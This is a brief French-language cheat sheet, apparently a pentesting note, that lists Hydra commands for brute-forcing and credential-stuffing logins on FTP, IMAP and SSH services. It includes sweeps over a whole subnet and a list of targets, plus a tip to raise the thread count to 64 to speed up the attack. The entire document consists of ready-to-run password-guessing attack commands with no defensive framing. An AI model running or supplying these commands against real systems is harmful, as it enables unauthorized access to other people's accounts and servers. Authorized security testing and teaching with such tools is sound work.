---
public: true # set to true to make the article publishable
---
```
hydra -l user -P passlist.txt ftp://192.168.0.1
hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN

# credential stuffing
hydra -C user_pass.list ssh://$TARGET_IP
hydra -l admin -p password ftp://[192.168.0.0/24]/
hydra -L logins.txt -P pws.txt -M targets.txt ssh
```

## Augmenter la rapidité de l'attaque

On peut utiliser `-t 64` pour augmenter le nombre de threads

```
hydra -l sam -P mut_password.list ftp://$TARGET_IP -t 64 
```

